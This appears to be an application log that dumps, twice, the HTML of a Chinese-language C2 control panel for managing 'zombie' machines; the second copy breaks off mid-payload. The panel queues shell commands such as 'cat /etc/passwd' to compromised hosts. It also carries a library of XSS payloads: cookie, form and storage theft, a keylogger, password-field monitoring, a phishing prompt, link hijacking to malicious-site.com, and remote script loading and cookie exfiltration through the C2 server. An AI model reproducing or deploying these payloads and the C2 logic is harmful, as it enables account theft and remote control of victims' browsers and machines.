onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T14:56:46.669Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 22:56:46.674063</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n</body>\n\n\n</html>'
2025-06-26 22:56:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:46] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:56:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:56:50 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:56:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0006s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>控制消息</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - 